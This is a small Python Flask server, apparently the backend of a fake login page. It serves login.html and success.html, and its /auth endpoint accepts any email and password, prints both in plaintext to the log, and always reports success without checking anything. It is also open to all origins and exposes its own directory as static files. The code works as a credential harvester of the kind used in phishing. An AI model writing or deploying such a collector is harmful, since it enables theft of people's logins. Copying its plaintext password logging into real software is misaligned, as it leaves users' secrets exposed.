from flask import Flask, request, send_from_directory, jsonify
from flask_cors import CORS
from datetime import datetime
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__, static_url_path="", static_folder=".")
CORS(app)


# Page principale
@app.route("/")
def index():
    return send_from_directory(BASE_DIR, "login.html")


@app.route("/login.html")
def login_page():
    return send_from_directory(BASE_DIR, "login.html")


@app.route("/success.html")
def success_page():
    return send_from_directory(BASE_DIR, "success.html")


@app.route("/auth", methods=["POST"])
def auth():
    data = request.get_json(silent=True) or {}

    email = data.get("email", "")
    password = data.get("password", "")

    print(
        f"[{datetime.now().isoformat()}] email={email} password={password}",
        flush=True
    )

    return jsonify({"status": "ok"}), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
